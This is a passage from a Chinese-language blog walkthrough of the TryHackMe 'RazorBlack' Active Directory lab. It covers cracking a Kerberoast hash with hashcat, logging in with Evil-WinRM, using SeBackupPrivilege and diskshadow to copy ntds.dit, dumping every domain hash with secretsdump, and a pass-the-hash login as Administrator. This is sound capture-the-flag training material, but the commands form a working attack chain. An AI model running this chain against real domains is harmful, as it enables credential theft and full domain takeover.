class="variable">$99e949327fb5de82e27af6f471ca7d895f9f34c0db59cf13af8472194222833bfb33f9926e35c8f37d99f5252be57db29e34ec7a0e5295a524c4f187cc335c1c68bd330f71217bd1ff7e439fadd5e3a2d49fc348c43077b9572efd075cf22ea7266ef732cbe6566a1ee6130352b2e59fa19769a6a321ecce292daa5af5d9b4892adc6d0271be9d4f0ed6d69b49767c27cafdfb2a9055edbf8412e36b81f38f33aaa07d4fe61129469aa1e0e8a4744e005db57b105531456558070a64b951cf9c0bbb1aac6edfdcacb91846ad4df7ee71930766fdacc6aab7348d646463d6e6ad27ec5cbb6877d3cee5b36ea5eefd771408a777a855357a4b01a50bd92858e1515d09edcea4ce8c71b6091a771a8e916221c695800e6734d73f9a7a6baab6f353e83cbd5d2830318701c250eeb364839203c9517f535bcb82edc0fd621c39a09fd44c09a690f8d2eb2fa2e0ab111dab0c954401f8f96a1f798b499e87c0c09857e55eaead855cd294544499fde649de2415fbbe1415d8d9cdfab57dc45c8666d10c8967423a85ea11a6dcee4a2f8097d1be9eaf2a9d25807ff5c4bf21fe4609897edde76ddf65c457081ddb4489404ab80219d3612880e670cdce4bced224dd5d5389f88907fbe3559b2769a950ee0390f91013f0a4e18c9a51b6db65e53b54c9c48eac6acc496419d63a7e76bd9e2b9098c1a3504633c581513ab94b913f970930721fd692f469e8737ff0956f6b05b05e550e77442e1923a146503da12815c2b5e8c938b96908dc54c0c00b88ec9295c5bbb0edb85f8af575a96029b18f3ba02bddc8202df3ec609c6f80247942a9dc88874ea2b09ee904170b3e9b51e4158d075070951d56413bd9711fa91c0f032949e1ce8055e33b2f1062d2e8b25dbe736b054ebdafec3bb4c37b4f53269ac971fd658c8740c4fe63b021f61516bc2150222acbdb94fe4f1e7701c754d3f9a559445719a97ffe29192e0a725b37df51dae5f8139ff2832d2de4949f4c799de8b0fe3db1c92a730db4f14629d04867c7663d3745dc2f6cb4b8b0ff329d53b5f4c834b66231c67528c63d57e41a486c1337a3a5be3c5e0936c7a1ec3e62b51761bb1ab089074b4cf90dcf2f7f6af2435826bedf8d3c09a29cdc89bc7188618aa76a4374049aadc17b7539c827aae0b08c6a34bf0d1c10bcb6c90bb0721aab016529b4840d526832a8e52829f03a391111795155a7c5c74b504e636f4ebf40364f00271e3dfbe46ed1a06f9555f0b727903467a50a221de45067e7b68ba7031a136d51983bd4c21f7d74c261174e67861751af3c7f97bb5c98930e93517f19652f500dba625b511f9dd2b203092af4e843473111120917e0003c8db0ab584e58a6f3f8db2bef136c67bab029a44102f6513c41c90db009d903d3934af6877fc238</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$hashcat</span> -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt</span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">$krb5tgs$23$*xyan1d3<span class="variable">$RAZ0RBLACK</span>.THM<span class="variable">$raz0rblack</span>.thm/xyan1d3*$1a5564b34ebfedb209a82d03599d840a<span class="variable">$99e949327fb5de82e27af6f471ca7d895f9f34c0db59cf13af8472194222833bfb33f9926e35c8f37d99f5252be57db29e34ec7a0e5295a524c4f187cc335c1c68bd330f71217bd1ff7e439fadd5e3a2d49fc348c43077b9572efd075cf22ea7266ef732cbe6566a1ee6130352b2e59fa19769a6a321ecce292daa5af5d9b4892adc6d0271be9d4f0ed6d69b49767c27cafdfb2a9055edbf8412e36b81f38f33aaa07d4fe61129469aa1e0e8a4744e005db57b105531456558070a64b951cf9c0bbb1aac6edfdcacb91846ad4df7ee71930766fdacc6aab7348d646463d6e6ad27ec5cbb6877d3cee5b36ea5eefd771408a777a855357a4b01a50bd92858e1515d09edcea4ce8c71b6091a771a8e916221c695800e6734d73f9a7a6baab6f353e83cbd5d2830318701c250eeb364839203c9517f535bcb82edc0fd621c39a09fd44c09a690f8d2eb2fa2e0ab111dab0c954401f8f96a1f798b499e87c0c09857e55eaead855cd294544499fde649de2415fbbe1415d8d9cdfab57dc45c8666d10c8967423a85ea11a6dcee4a2f8097d1be9eaf2a9d25807ff5c4bf21fe4609897edde76ddf65c457081ddb4489404ab80219d3612880e670cdce4bced224dd5d5389f88907fbe3559b2769a950ee0390f91013f0a4e18c9a51b6db65e53b54c9c48eac6acc496419d63a7e76bd9e2b9098c1a3504633c581513ab94b913f970930721fd692f469e8737ff0956f6b05b05e550e77442e1923a146503da12815c2b5e8c938b96908dc54c0c00b88ec9295c5bbb0edb85f8af575a96029b18f3ba02bddc8202df3ec609c6f80247942a9dc88874ea2b09ee904170b3e9b51e4158d075070951d56413bd9711fa91c0f032949e1ce8055e33b2f1062d2e8b25dbe736b054ebdafec3bb4c37b4f53269ac971fd658c8740c4fe63b021f61516bc2150222acbdb94fe4f1e7701c754d3f9a559445719a97ffe29192e0a725b37df51dae5f8139ff2832d2de4949f4c799de8b0fe3db1c92a730db4f14629d04867c7663d3745dc2f6cb4b8b0ff329d53b5f4c834b66231c67528c63d57e41a486c1337a3a5be3c5e0936c7a1ec3e62b51761bb1ab089074b4cf90dcf2f7f6af2435826bedf8d3c09a29cdc89bc7188618aa76a4374049aadc17b7539c827aae0b08c6a34bf0d1c10bcb6c90bb0721aab016529b4840d526832a8e52829f03a391111795155a7c5c74b504e636f4ebf40364f00271e3dfbe46ed1a06f9555f0b727903467a50a221de45067e7b68ba7031a136d51983bd4c21f7d74c261174e67861751af3c7f97bb5c98930e93517f19652f500dba625b511f9dd2b203092af4e843473111120917e0003c8db0ab584e58a6f3f8db2bef136c67bab029a44102f6513c41c90db009d903d3934af6877fc238</span>:cyanide9amine5628</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xyan1d3:cyanide9amine5628</span><br></pre></td></tr></table></figure>

<p>它是远程管理组，可以直接走winrm登录:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$evil</span>-winrm -i 10.10.104.184 -u xyan1d3 -p cyanide9amine5628</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.4</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3\Documents&gt; <span class="built_in">ls</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3\Documents&gt; <span class="built_in">cd</span> ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\xyan1d3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Desktop</span><br><span class="line">d-r---        2/25/2021   9:34 AM                Documents</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Downloads</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Favorites</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Links</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Music</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Pictures</span><br><span class="line">d-----        9/15/2018  12:19 AM                Saved Games</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Videos</span><br><span class="line">-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="variable">$cred</span> = Import-CliXml -Path xyan1d3.xml</span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="variable">$cred</span>.GetNetworkCredential() | Format-List *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UserName       : Nope your flag is not here</span><br><span class="line">Password       : LOL here it is -&gt; THM&#123;62ca7e0b901aa8f0b233cade0839b5bb&#125;</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         :</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3&gt; </span><br></pre></td></tr></table></figure>

<h4 id="渗出："><a href="#渗出：" class="headerlink" title="渗出："></a>渗出：</h4><p>之前Bloodhound已经看到是备份组了。滥用SeBackupPrivilege权限就好了，先拷贝卷影副本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span> backup </span><br><span class="line"><span class="built_in">set</span> metadata C:\tmp\tmp.cabs</span><br><span class="line"><span class="built_in">set</span> context persistent nowriters</span><br><span class="line">add volume c: <span class="built_in">alias</span> whomi</span><br><span class="line">create</span><br><span class="line">expose %whomi% z:</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\tmp&gt; diskshadow.exe /s c:\tmp\backup.txt</span><br><span class="line">Microsoft DiskShadow version 1.0</span><br><span class="line">Copyright (C) 2013 Microsoft Corporation</span><br><span class="line">On computer:  HAVEN-DC,  6/26/2022 12:14:45 AM</span><br><span class="line"></span><br><span class="line">-&gt; <span class="built_in">set</span> metadata C:\tmp\tmp.cabs</span><br><span class="line">-&gt; <span class="built_in">set</span> context persistent nowriters</span><br><span class="line">-&gt; add volume c: <span class="built_in">alias</span> someAlias</span><br><span class="line">-&gt; create</span><br><span class="line">Alias someAlias <span class="keyword">for</span> shadow ID &#123;48295b02-4a09-4381-b8b3-da5287ecfb39&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line">Alias VSS_SHADOW_SET <span class="keyword">for</span> shadow <span class="built_in">set</span> ID &#123;13b7e680-ec6c-4ba6-9680-93b35e739603&#125; <span class="built_in">set</span> as environment variable.</span><br><span class="line"></span><br><span class="line">Querying all shadow copies with the shadow copy <span class="built_in">set</span> ID &#123;13b7e680-ec6c-4ba6-9680-93b35e739603&#125;</span><br><span class="line"></span><br><span class="line">	* Shadow copy ID = &#123;48295b02-4a09-4381-b8b3-da5287ecfb39&#125;		%someAlias%</span><br><span class="line">		- Shadow copy <span class="built_in">set</span>: &#123;13b7e680-ec6c-4ba6-9680-93b35e739603&#125;	%VSS_SHADOW_SET%</span><br><span class="line">		- Original count of shadow copies = 1</span><br><span class="line">		- Original volume name: \\?\Volume&#123;115c1f55-0000-0000-0000-602200000000&#125;\ [C:\]</span><br><span class="line">		- Creation time: 6/26/2022 12:14:49 AM</span><br><span class="line">		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1</span><br><span class="line">		- Originating machine: HAVEN-DC.raz0rblack.thm</span><br><span class="line">		- Service machine: HAVEN-DC.raz0rblack.thm</span><br><span class="line">		- Not exposed</span><br><span class="line">		- Provider ID: &#123;b5946137-7b9f-4925-af80-51abd60b20d5&#125;</span><br><span class="line">		- Attributes:  No_Auto_Release Persistent No_Writers Differential</span><br><span class="line"></span><br><span class="line">Number of shadow copies listed: 1</span><br><span class="line">-&gt; expose %someAlias% h:</span><br><span class="line">-&gt; %someAlias% = &#123;48295b02-4a09-4381-b8b3-da5287ecfb39&#125;</span><br><span class="line">The shadow copy was successfully exposed as h:\.</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/giuliano108/SeBackupPrivilege</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3&gt; upload /home/mosaic/ToolBox/Bugs/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll</span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3&gt; upload /home/mosaic/ToolBox/Bugs/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll</span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\xyan1d3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Desktop</span><br><span class="line">d-r---        2/25/2021   9:34 AM                Documents</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Downloads</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Favorites</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Links</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Music</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Pictures</span><br><span class="line">d-----        9/15/2018  12:19 AM                Saved Games</span><br><span class="line">d-r---        9/15/2018  12:19 AM                Videos</span><br><span class="line">-a----        6/26/2022  12:00 AM          12288 SeBackupPrivilegeCmdLets.dll</span><br><span class="line">-a----        6/26/2022  12:00 AM          16384 SeBackupPrivilegeUtils.dll</span><br><span class="line">-a----        2/25/2021   9:33 AM           1826 xyan1d3.xml</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3&gt; Import-Module .\SeBackupPrivilegeUtils.dll</span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3&gt; Import-Module .\SeBackupPrivilegeCmdLets.dll</span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="built_in">mkdir</span> C:\tmp</span><br><span class="line">*Evil-WinRM* PS C:\Users\xyan1d3&gt; <span class="built_in">cd</span> c:\tmp</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt; copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt; reg save HKLM\SYSTEM C:\tmp\system</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt; download ntds.dit</span><br><span class="line">*Evil-WinRM* PS C:\tmp&gt; download system</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -system system -ntds ntds.dit LOCAL</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::</span><br><span class="line">raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::</span><br><span class="line">raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::</span><br><span class="line">raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::</span><br><span class="line">raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::</span><br><span class="line">[*] Kerberos keys from ntds.dit </span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8</span><br><span class="line">Administrator:des-cbc-md5:d3b646b65bceb5c7</span><br><span class="line">HAVEN-DC$:aes256-cts-hmac-sha1-96:d6b41169e02a4543b90a8c697b167948413397c30f1bf5f0199a54f387358fc6</span><br><span class="line">HAVEN-DC$:aes128-cts-hmac-sha1-96:5ed5bd57484ca826e09afa6e5b944c27</span><br><span class="line">HAVEN-DC$:des-cbc-md5:f71a0dc89b9d079d</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb</span><br><span class="line">krbtgt:des-cbc-md5:857a46f13e91eae3</span><br><span class="line">raz0rblack.thm\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f</span><br><span class="line">raz0rblack.thm\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61</span><br><span class="line">raz0rblack.thm\xyan1d3:des-cbc-md5:e9a1a46223cd8975</span><br><span class="line">raz0rblack.thm\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39</span><br><span class="line">raz0rblack.thm\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839</span><br><span class="line">raz0rblack.thm\lvetrova:des-cbc-md5:385d6e1f1cc17fb6</span><br><span class="line">raz0rblack.thm\sbradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5</span><br><span class="line">raz0rblack.thm\sbradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580</span><br><span class="line">raz0rblack.thm\sbradley:des-cbc-md5:83fe3e584f4a5bf8</span><br><span class="line">raz0rblack.thm\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559</span><br><span class="line">raz0rblack.thm\twilliams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a</span><br><span class="line">raz0rblack.thm\twilliams:des-cbc-md5:01e958b0ea6edf07</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$evil</span>-winrm -i 10.10.104.184 -u administrator -H 9689931bed40ca5a2ce1218210177f0c</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.4</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><br></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/TryHackMe/" class="category-chain-item">TryHackMe</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Active-Directory/" class="print-no-link">#Active Directory</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>TryHackMe Walkthrough - RazorBlack</div>
      <div>https://crazyinside.github.io/post/TryHackMe-RazorBlack.html</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>World'sEnd</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>August 14, 2023</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/post/Tryhackme-Skynet.html" title="TryHackMe Walkthrough - Skynet">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">TryHackMe Walkthrough - Skynet</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/post/TryHackMe-Ra.html" title="TryHackMe Walkthrough - Ra">
                        <span class="hidden-mobile">TryHackMe Walkthrough - Ra</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
